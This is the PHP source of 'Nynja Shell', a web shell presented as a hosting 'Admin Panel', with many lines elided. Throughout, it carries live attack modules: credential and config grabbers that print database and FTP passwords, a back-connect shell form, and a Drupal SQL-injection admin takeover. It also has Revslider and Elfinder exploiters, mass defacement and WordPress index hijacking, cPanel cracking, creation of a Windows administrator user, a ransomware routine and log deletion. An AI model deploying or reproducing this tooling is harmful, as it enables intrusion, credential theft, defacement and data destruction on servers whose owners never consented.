...
$password = "c4cdd6b69797e47b48ab72af29c8b826"; 
...
<input id="login__password" type="password" name="password" class="form__input" placeholder="Password" autocomplete="off" required>
</div>
<div class="form__field">
<input type="submit" value="Sign In">
</div>
</form>
<p class="text--center">Not an Admin? <a href="/">Register an account now!</a> <svg class="icon"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="assets/images/icons.svg#arrow-right"></use></svg></p>
</div>
...
?>
	...
	<body>
		...
		<div class="container">
			...
			<div class="y x">
				<a href="?" class="ajx">
					<font color="black">Admin Panel</font>
				</a>
			</div>
  ...
  echo "<br><br>";
  echo '<a class="btn btn-primary btn-sm ml-3 ajx" href="?d=' .
      hex($d) .
      '&n">+NEWFILE+</a>
						  <a class="btn btn-primary btn-sm ajx " href="?d=' .
      hex($d) .
      '&l">+NEWDIR+</a>';
  ...
  if (isset($_GET["s"])) {
      echo $a_ .
          ...
          '</textarea>
									<br />
									<br />
									<input onclick="location.href=\'?d=' .
          $_GET["d"] .
          "&e=" .
          $_GET["s"] .
          '\'" type="submit" class="form-control col-md-3" value="&nbsp;EDIT&nbsp;" />
								' .
          $c_;
  } elseif (isset($_GET["y"])) {
      echo $a_ .
	...
	MySQL : ' .
      ...
      echo "<hr>
						<h2><center>Mass Tools Nynja Shell</center></h2>
						<br>
						<center>
						<form method = 'POST'>
						<div class = 'row clearfix'>
						<div class = 'col-md-4'>
						<a class = 'form-control ajx' href = '?d=" .
          hex($d) .
          "&" .
          hex("mass_tool") .
          "' style='width: 250px;' height='10'><center>Mass Deface / Delete Files</center></a>
						</div>
						<div class = 'col-md-4'>
						<a class = 'form-control ajx' href = '?d=" .
          hex($d) .
          "&" .
          hex("mass_user") .
          "' style='width: 250px;' height='10'><center>Mass User Changer</center></a>
						</div>
						<div class = 'col-md-4'>
						<a class = 'form-control ajx' href = '?d=" .
          hex($d) .
          "&" .
          hex("mass_title") .
          "' style='width: 250px;' height='10'><center>Mass Title Changer</center></a>
						</div>
      ...
      echo "<hr><br>";
      echo "<center>
						<h2> Symlink Nynja Shell </h2> <br><br>
						<form method = 'POST'>
						<div class = 'row clearfix'>
						<div class = 'col-md-4'>
      ...
      if (isset($_POST["symlink"])) {
          ...
          echo "<br><br><center><h2>Symlink Nynja Shell</h2></center><br><br><center><div class=content>";
              ...
              foreach ($read_named_conf as $subject) {
                  if (eregi("zone", $subject)) {
                      ...
                      if (strlen(trim($string[1][0])) > 2) {
                          ...
                          if (
                              eregi("$iran", $string[1][0]) or
                              eregi("$israel", $string[1][0]) or
                              eregi("$indo", $string[1][0]) or
                              eregi("$sg12", $string[1][0]) or
                              eregi("$edu", $string[1][0]) or
                              eregi("$gov", $string[1][0]) or
                              eregi("$gose", $string[1][0]) or
                              eregi("$gober", $string[1][0]) or
                              eregi("$mil1", $string[1][0]) or
                              eregi("$mil2", $string[1][0]) or
                              eregi("$malay", $string[1][0]) or
                              eregi("$china", $string[1][0]) or
                              eregi("$japan", $string[1][0]) or
                              eregi("$austr", $string[1][0]) or
                              eregi("$porn", $string[1][0]) or
                              eregi("$as", $string[1][0]) or
                              eregi("$calfn", $string[1][0])
                          ) {
                              $name =
...
<td>" .
                              $user["name"] .
                              "</td>
<td><a href='$full/Exc_sym/root/home/" .
                              $user["name"] .
...
Satisfy Any';
 ...
 <td align=center><font class=txt>" .
                          $matches .
                          "</td>";
                      echo "<td align=center><font class=txt><a href=$full/Exc_sym/root/home/" .
                          $matches .
...
';
                      ...
                      @fclose($fp3);
                      echo "
 <h2><center>Symlink2 Nynja Shell</center></h2>
 <table align=center border=1><tr>
 ...
 <td align=center><font class=txt>" .
      ...
      if ($_POST) {
              ...
              if (is_readable($user_config_dir)) {
                  ...
                  foreach ($grab_config as $config => $nama_config) {
                      ...
                      if ($ambil_config == "") {
                          ...
                          $file_config = fopen(
                              "Exc_config/$user_Exc-$nama_config.txt",
                              "w"
                          );
          ...
          echo "<hr><br><center>";
          echo "<h2>Config Grabber Nynja Shell</h2>";
							...
							<table>
								<form method="post">
									<tr>
										...
										<td><input class="form-control" type="text" name="ip" size="26" value="<?php echo getenv(
              "REMOTE_ADDR"
          )
              ? getenv("REMOTE_ADDR")
              : "127.0.0.1"; ?>"><br><br><input class="form-control" type="text" name="backport" size="26" value="<?php echo $bindport; ?>"><br><select size="1" class="form-control" name="use">
												<option value="Perl">Perl</option>
												<option value="C">C</option>
      ...
      if ($_POST["mass"] == "onedir") {
          ...
          echo "
		<hr><br>
		<center><h2>Mass Deface / Delete Files Nynja Shell</h2><font style='text-decoration: underline;'>
		Select Type:<br>
		</font>
      ...
      if ($_POST["hajar"]) {
              ...
              foreach ($scan_conf as $file_conf) {
                  ...
                  if (preg_match("/JConfig|joomla/", $config)) {
                      ...
                      if (!$update or !$conn or !$db) {
                          ...
                          print "Status => " .
                              color(
                                  1,
                                  2,
                                  "sukses edit user, silakan login dengan user & pass yang baru."
                              ) .
                              "<br><br>";
                      }
                      mysql_close($conn);
                      ...
                      if ($target == "") {
                          $url_target =
                              "Login => " .
                              color(1, 1, "Cant't get domain name") .
                              "<br>";
                      } else {
          ...
          print "<center>
				<h2>Mass User Changer Nynja Shell</h2>
				<form method='post'>
				...
				<input type='text' size='50' name='config_dir' style='width:250px;' height = '10' class='form-control' value='" .
              path() .
              "'><br><br>
				Set User & Pass: <br>
      ...
      echo "<hr><br><center><h2>Mass Title Changer Nynja Shell</h2>
<form method='post'>
Link Config: <br>
...
<input type='submit' style='width: 450px;' name='edittitle' value='Hajar!!'>
      ...
      if ($_POST["edittitle"]) {
          ...
          foreach ($link as $dir_config) {
              ...
              $target = $result2[option_value];
              $update = mysql_query(
                  "UPDATE $prefix SET post_title='$title',post_content='$content',post_name='$postname',post_status='publish',comment_status='open',ping_status='open',post_type='post',comment_count='1' WHERE id='$id'"
              );
              $update .= mysql_query(
      ...
      echo "<hr><br>";
      echo "<center><h2>Bypasser Nynja Shell</h2></center><br>";
      echo "<form method = 'POST'>
          ...
          "&" .
          hex("bypass-cf") .
          "' style='width: 250px;' height='10'><center>Bypass CloudFlare</center></a>
						</div>
						<div class = 'col-md-3'>
						<a class = 'form-control ajx' href = '?d=" .
          hex($d) .
          "&" .
          hex("bypass-server") .
          "' style='width: 250px;' height='10'><center>Bypass Server</center></a>
						</div>
						<div class = 'col-md-3'>
						<a class = 'form-control ajx' href = '?d=" .
          hex($d) .
          "&" .
          hex("bypass-vhost") .
          "' style='width: 250px;' height='10'><center>Bypass Vhost</center></a>
						</div>
						<div class = 'col-md-3'>
						<a class = 'form-control ajx' href = '?d=" .
          hex($d) .
          "&" .
          hex("bypass-passwd") .
          "' style='width: 250px;' height='10'><center>Bypass Passwd</center></a>
						</div>
						</div></form>";
      echo "<hr>";
      ...
      echo '
				...
				<h2>Bypass CloudFlare Nynja Shell</h2>
				<div class = "row clearfix">
				<div class= "col-md-4">
      ...
      $dir = path(); ?>
			<form action="?dir=<?php echo $dir; ?>&amp;do=bypassserver" method="post">
				<center /><br />
				<hr>
				<h2>Bypass Server Nynja Shell</h2><br>
				<?php
    print '
...
<tr>
    ...
    <td><form method="post"><input type="submit" class = "form-control" value="Shell_exec Function" name="shexuser"></form></td>
      ...
      echo "<hr><br>";
      echo "<center><h2>Exploiter Nynja Shell</h2></center><br>";
      echo "<form method = 'POST'>
						<div class = 'row clearfix'>
						<div class = 'col-md-3'>
						<a class = 'form-control ajx' href = '?d=" .
          ...
          "&" .
          hex("csrf") .
          "' style='width: 250px;' height='10'><center>CSRF Exploiter</center></a>
						</div>
						<div class = 'col-md-3'>
						<a class = 'form-control ajx' href = '?d=" .
          hex($d) .
          "&" .
          hex("revslider") .
          "' style='width: 250px;' height='10'><center>Revslider Exploiter</center></a>
						</div>
						<div class = 'col-md-3'>
						<a class = 'form-control ajx' href = '?d=" .
          hex($d) .
          "&" .
          hex("elfinder") .
          "' style='width: 250px;' height='10'><center>Elfinder Exploiter</center></a>
						</div>
						<div class = 'col-md-3'>
						<a class = 'form-control ajx' href = '?d=" .
          hex($d) .
          "&" .
          hex("drupal") .
          "' style='width: 250px;' height='10'><center>Drupal Exploiter</center></a>
						</div>
      ...
      echo '
<hr><br><center><h2 style="font-size:33px;">CSRF Exploiter Nynja Shell</h2><br><br>
...
<center><hr><br>
<h2>Revslider Exploiter Nynja Shell</h2>
<form method='post'>
...
",
          ...
          foreach ($e as $bda) {
              ...
              if (eregi("DB_HOST", $file) and !eregi("FTP_USER", $file)) {
                  ...
                  echo "<center><font face='courier' color='lime' >" .
                      $bda .
                      "</font></center>";
                  echo "<font face='courier' color=lime >DB name : </font>" .
                      findit($file, "DB_NAME', '", "');") .
                      "<br>";
                  echo "<font face='courier' color=lime >DB user : </font>" .
                      findit($file, "DB_USER', '", "');") .
                      "<br>";
                  echo "<font face='courier' color=lime >DB pass : </font>" .
                      findit($file, "DB_PASSWORD', '", "');") .
                      "<br>";
                  echo "<font face='courier' color=lime >DB host : </font>" .
                      findit($file, "DB_HOST', '", "');") .
                      "<br>";
                  ...
                  echo "<center><font face='courier' color='lime' >" .
                      $bda .
                      "</font></center>";
                  echo "<font face='courier' color=lime >FTP user : </font>" .
                      findit($file, "FTP_USER','", "');") .
                      "<br>";
                  echo "<font face='courier' color=lime >FTP pass : </font>" .
                      findit($file, "FTP_PASS','", "');") .
                      "<br>";
                  echo "<font face='courier' color=lime >FTP host : </font>" .
                      findit($file, "FTP_HOST','", "');") .
                      "<br>";
              } else {
                  echo "<center><font face='courier' color='red' >" .
                      $bda .
                      " ----> not infected </font></center>";
              }
              echo '<center><font face="courier" color=white >----------------------------------------------</font></center>';
          }
      }
...
0IG5hbWU9diB0eXBlPXN1Ym1pdCBpZD12IHZhbHVlPXVwPjxicj4iOwp9Cgo/Pg==";
   ...
   <input type='submit' value='drupal !' />
      ...
      if (isset($_POST["submit"])) {
          ...
          {
              $post_data =
                  "name[0;update users set name %3D 'Exorcism' , pass %3D '" .
                  urlencode(
                      '$S$DrV4X74wt6bT3BhJa4X0.XO5bHXl/QBnFkdDkYSHj3cE1Z5clGwu'
                  ) .
                  "',status %3D'1' where uid %3D '1';#]=FcUk&name[]=Crap&pass=test&form_build_id=&form_id=user_login&op=Log+in";
              $params = [
                  "http" => [
                      "method" => "POST",
...
",
              ...
              if (
                  (stristr(
                      ...
                      $data) ||
                  (stristr($data, "FcUk Crap") && $data)
              ) {
                  $fp = fopen("exploited.txt", "a+");
                  fwrite(
                      $fp,
                      "Exploitied  User: Exorcism Pass: Exorcism  =====> {$url}/user/login"
                  );
                  fwrite(
                      $fp,
                      "
...
",
      ...
      echo '<hr><center><h2>Auto Tools Nynja Shell </h2><br>
<table style="width:90%">
  <tr>
    <td><a class = "form-control ajx" href = ?d=' .
          ...
          "&" .
          hex("zone-h") .
          '><center>Zone H</center></a></td>
    <td><a class = "form-control ajx" href = ?d=' .
          hex($d) .
          "&" .
          hex("defacer-id") .
          '><center>Defacer ID</center></a></td>
    <td><a class = "form-control ajx" href = ?d=' .
          hex($d) .
          "&" .
          hex("jumping") .
          '><center>Jumping</center></a></td>	
    <td><a class = "form-control ajx" href = ?d=' .
          hex($d) .
          "&" .
          hex("fake-root") .
          '><center>Fake Root</center></a></td>	
    <td><a class = "form-control ajx" href = ?d=' .
          hex($d) .
          "&" .
          hex("adminer") .
          '><center>Adminer</center></a></td>
</tr>
<tr>
    <td><a class = "form-control ajx" href = ?d=' .
          hex($d) .
          "&" .
          hex("wp-hijack") .
          '><center>Wp Auto Hijack</center></a></td>
    <td><a class = "form-control ajx" href = ?d=' .
          hex($d) .
          "&" .
          hex("cpanel-reset") .
          '><center>Cpanel Reset</center></a></td>
    <td><a class = "form-control ajx" href = ?d=' .
          hex($d) .
          "&" .
          hex("zip-menu") .
          '><center>Zip Menu</center></a></td>
    <td><a class = "form-control ajx" href = ?d=' .
          hex($d) .
          "&" .
          hex("reverse-ip") .
          '><center>Reverse IP</center></a></td>
    <td><a class = "form-control ajx" href = ?d=' .
          hex($d) .
          "&" .
          hex("rdp") .
          '><center>K-RDP Shell</center></a></td>
</tr>
<tr>
    <td><a class = "form-control ajx" href = ?d=' .
          hex($d) .
          "&" .
          hex("ransomware") .
          '><center>Ransomware</center></a></td>
    <td><a class = "form-control ajx" href = ?d=' .
          hex($d) .
          "&" .
          hex("whois") .
          '><center>WhoIs</center></a></td>
    <td><a class = "form-control ajx" href = ?d=' .
          hex($d) .
          "&" .
          hex("phpinfo") .
          '><center>Php Info</center></a></td>	
    <td><a class = "form-control ajx" href = ?d=' .
          hex($d) .
          "&" .
          hex("inject-code") .
...
<tr>
    <td><a class = "form-control ajx" href = ?d=' .
          ...
          "&" .
          hex("cp-crack") .
          '><center>Cpanel Crack</center></a></td>
    <td><a class = "form-control ajx" href = ?d=' .
          hex($d) .
          "&" .
          hex("smtp-grab") .
          '><center>SMTP Grabber</center></a></td>	
    <td><a class = "form-control ajx" href = ?d=' .
          hex($d) .
          "&" .
          hex("domains") .
          '><center>Domains Viewer</center></a></td>
    <td><a class = "form-control ajx" href = ?d=' .
          hex($d) .
          "&" .
          hex("whmcs-decoder") .
          '><center>WHMCS Decoder</center></a></td>	
    <td><a class = "form-control ajx" href = ?d=' .
          hex($d) .
          "&" .
          hex("delete-logs") .
          '><center>Delete Logs</center></a></td>
</tr>
</table>
<br><hr>';
				...
				<form action="" method="post">
					<center>
						<hr><br>
						<h2>Zone H Submit Nynja Shell</h2>
						<u>Defacer :</u>
     ...
     ?>
			...
			<?php } elseif (isset($_GET[hex("defacer-id")])) {
      echo "<hr><br><center>
		<h2>Defacer ID Submit Nynja Shell</h2>
		<form method='post'>
		<u>Defacer</u>: <br>
      ...
      echo "<hr><br><center><h2>Jumping Nynja Shell</h2>";
      ...
      if (!preg_match("#/home/$user/public_html#", $_SERVER["DOCUMENT_ROOT"])) {
          die("I Think this server is not using shared host ");
      }
      ...
      if ($_POST["reverse"]) {
          ...
          echo "<hr><br><center><h2>Fake Root Nynja Shell</h2><form method='post'>
      ...
      echo "<hr><br>";
      echo "<center><h2>Adminer Nynja Shell</h2>";
      ...
      if (strtolower(substr(PHP_OS, 0, 3)) === "win") {
          if ($_POST["create"]) {
              ...
              if (preg_match("/$user/", exe("net user"))) {
                  ...
                  $add_groups3 = exe(
                      "net localgroup Administrateur $user /add"
                  );
...
<h2>Wordpress Hijack Index Nynja Shell</h2><br>
<center>
...
<input style="width:250px;height:40px;" class="form-control" type="submit" name="up2" value="Hijack Index"><br></center><form><hr><br>';
      ...
      if ($_POST["up2"]) {
          ...
          $ghost1 = mysql_query(
              "UPDATE $tableName SET post_title ='" . $index . "' WHERE ID > 0 "
          );
          if (!$ghost1) {
              $ghost2 = mysql_query(
                  "UPDATE $tableName SET post_content ='" .
                      $index .
                      "' WHERE ID > 0 "
              );
          } elseif (!$ghost2) {
              $ghost3 = mysql_query(
                  "UPDATE $tableName SET post_name ='" .
                      $index .
                      "' WHERE ID > 0 "
              );
          }
      ...
      echo '
		<hr><br>
         <center>
         <h2>Cpanel Reset Nynja Shell</h2>
         <br><br>
...
<input class='form-control' type='submit' name='backup' class='kotak' value='Back Up!' style='width: 215px;'></form><br><br>";
          ...
          function Zip($source, $destination)
          {
              if (extension_loaded("zip") === true) {
                  if (file_exists($source) === true) {
                      $zip = new ZipArchive();
                      if (
                          $zip->open($destination, ZIPARCHIVE::CREATE) === true
                      ) {
    ...
    ";
      ...
      echo "</table><hr>";
				...
				<hr>
				<center>
					<h2>Reverse IP Nynja Shell</h2>
					<a style="width: 250px;" class="form-control" onClick="window.open('http://www.viewdns.info/reverseip/?host=<?php echo $_SERVER[
         "SERVER_ADDR"
    ...
    "SERVER_ADDR"
				...
				<br>
				<hr>
			<?php } elseif (isset($_GET[hex("ransomware")])) {
      if (version_compare(PHP_VERSION, "7.2.0", "<")) {
          echo "<br><br><font color = red>This Ransomware Tool can only run on PHP version 7.2 and below. for PHP version 7.2 and above it is still in the development process </font> ";
          exit();
      } ?>
				<br>
				<hr>
         ...
         public function shcdirs($dir, $method, $key)
         {
             ...
             foreach (scandir($dir) as $d) {
                 if ($d != "." && $d != "..") {
                     ...
                     if (!is_dir($locate)) {
                         if (
                             deRanSomeware::kecuali($locate, "idx.php") &&
                             deRanSomeware::kecuali($locate, ".htaccess") &&
                             deRanSomeware::kecuali($locate, "virus.php") &&
                             deRanSomeware::kecuali($locate, "index.php") &&
                             deRanSomeware::kecuali($locate, ".htaencrypted")
                         ) {
                             switch ($method) {
                                 case "1":
...
9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
 ...
 #Ransomware Ini Berada Pada [dir]: <?php echo getcwd(); ?>/<?php
...
?>
     ...
     {
         $getip = @file_get_contents(
             "http://www.magic-net.info/dns-and-ip-tools.dnslookup?subd=" .
                 $site .
                 "&Search+subdomains=Find+subdomains"
         );
         $ip = @findit(
             $getip,
             "<strong>Nameservers found:</strong>",
   ...
   <div class=\"tit\"> <br /><br />|-------------- END ------------------| <br /></div>";
     ...
     echo "</center>";
      ...
      echo "<hr><br>";
      echo "<center><h2>Mass Code Injector Nynja Shell</h2></center>";
      ...
      if (isset($_POST["submit"]) && $_POST["submit"] == "Inject") {
          ...
          foreach ($dt as $d) {
              if ($mode == "a") {
                  ...
                  if (
                      file_put_contents($d . $DS . $name . "." . $type, $code)
                  ) {
                      echo "<div><strong>" .
                          $d .
                          $DS .
...
<h2>Database Dumper Nynja Shell</h2>
<tr>
	<td>Server </td>
	...
	<input class="form-control" type=submit value="  Dump!  " ></td></tr>
      ...
      if ($_POST["crack"]) {
          ...
          if ($i == 0) {
              ...
              echo "<br>sukses nyolong " .
                  $i .
                  " Cpanel by <font color=lime>Exc Shell.</font>";
          }
      } else {
          echo "<center><hr><br>
		<form method='post'>
		<h2>Cpanel Crack Nynja Shell</h2>
		USER: <br>
      ...
      function decrypt($string, $cc_encryption_hash)
      {
          ...
          while ($c < strlen($string)) {
              if ($c != 0 and $c % $hash_length == 0) {
                  $key = _hash(
                      $key . substr($out, $c - $hash_length, $hash_length)
                  );
              }
      ...
      echo "
<hr><br>
<br><center><h2>Whmcs Decoder Nynja Shell</h2></center>
...
";
      ...
      echo "<hr><br>";
      echo "<center><h2>Scanner Nynja Shell</h2></center><br>";
      echo "<form method = 'POST'>
						<center>
						<div class = 'row clearfix'>
						<div class = 'col-md-4'>
          ...
          "&" .
          hex("cmsvuln") .
          "' style='width: 250px;' height='10'><center>CMS Vulnerability Scanner</center></a>
						</div>
						<div class = 'col-md-4'>
						<a class = 'form-control ajx' href = '?d=" .
          hex($d) .
          "&" .
          hex("port-scanner") .
          "' style='width: 250px;' height='10'><center>Port Scanner</center></a>
						</div>
						<div class = 'col-md-4'>
						<a class = 'form-control ajx' href = '?d=" .
          hex($d) .
          "&" .
          hex("logs-scanner") .
          "' style='width: 250px;' height='10'><center>Logs Scanner</center></a>
						</div>
						</div></center></form>";
      echo "<hr>";
      ...
      function t_header($site)
      {
          ...
          echo '
<tr>
<td style="border-color=white">Site : <a href="' .
              $site .
              '">' .
              $site .
              '</a></td>
...
';
      ...
      echo "<center>";
      echo '<hr><br>
<h2>CMS Vulnerability Scanner Nynja Shell</h2>
<form method="POST" action=""  class="header-izz">
    ...
    <input class = "form-control" type="submit" style="width: 150px; height: 40px; border-color=white;margin:10px 2px 0 2px;" value="Scan" class="kotak"></p>
      ...
      if ($_POST) {
          ...
          t_header($site);
          echo $x01 =
              $_POST["pilihan"] == "Wordpress" ? get_plugins($site) : "";
          echo $x02 =
              $_POST["pilihan"] == "Joomla" ? get_components($site) : "";
      ...
      echo "<hr><br><center>";
      echo "<table><h2>Ports Scanner Nynja Shell</h2><td>";
      ...
      echo "<hr><br>";
      echo "<Center>\n";
      echo "<h2>Log Hunter Nynja Shell</h2>";
      echo "<form action=\"\" method=\"post\">\n";
        ...
        foreach (scandir($shcdirs) as $shc) {
            if ($shc != "." && $shc != "..") {
                ...
                if (!is_dir($shc) && !eregi("css", $shc)) {
                    ...
                    $shcm = "/mail['(']/";
                    if ($ifgt[$jembut][$taik]) {
                        echo "[<font color=#00FFD0>Stegano</font>] <font color=#2196F3>" .
                            $shc .
                            "</font><br>";
                    }
                    preg_match_all(
                    ...
                    if (
                        eregi("HTTP Cookie File", $fgt) ||
                        eregi("PHP Warning:", $fgt)
                    ) {
                    }
                    if (eregi("tmp_name", $fgt)) {
                        echo "[<font color=#FAFF14>Uploader</font>] <font color=#2196F3>" .
                            $shc .
                            "</font><br>";
                    }
                    if ($shcmar[0]) {
                        echo "[<font color=#FF3D00>Base64</font>] <font color=#2196F3>" .
                            $shc .
                            "</font><br>";
                    }
                    if ($mailshc[0]) {
                        echo "[<font color=#E6004E>MailFunc</font>] <font color=#2196F3>" .
                            $shc .
                            "</font><br>";
                    }
                    if ($shcxif[0]) {
                        echo "[<font color=#00FFD0>Stegano</font>] <font color=#2196F3>" .
                            $shc .
                            "</font> </font><font color=red>{Manual Check}</font><br>";
                    }
                    if (eregi("js", $shc)) {
                        echo "[<font color=red>Javascript</font>] <font color=#2196F3>" .
                            $shc .
                            "</font> { <a href=http://www.unphp.net target=_blank>CheckJS</a> }<br>";
                    }
                    if ($cocok[0]) {
                        foreach ($cocok[0] as $key => $shcmail) {
                            if (filter_var($shcmail, FILTER_VALIDATE_EMAIL)) {
                                echo "[<font color=greenyellow>SendMail</font>] <font color=#2196F3>" .
                                    $shc .
                                    "</font> { " .
                                    $shcmail .
                                    " }<br>";
...
echo "</div>";
      ...
      echo "<hr><br><center><h2>About Nynja Shell (Admin Panel)</h2>";
      echo "A repurposed webshell by paragram for webhostingserver management. If you appreciate it then lmk at Paragram#0121 on dicord or on my replit (linked in footer). Happy pentesting :) <br><br>";
      echo "Follow me : <a href = 'https://replit.com/@paragram' target = 'blank' class= 'form-control' style = 'width:250px;'>Replit!</a> <br><br>";
      echo "Thanks to : <br>
				...
				";
      echo "Dedicated to : <br>my chill friends and followers";
      echo "<hr><br></center>";
  ...
  ?>
				...
				<footer class="x">
					<center>&copy; Author : <a href="https://replit.com/@paragram">Paragram@Replit</a> </center>
				</footer>
				<?php if (isset($_GET["1"])) {
        echo $f;
    } elseif (isset($_GET["0"])) {
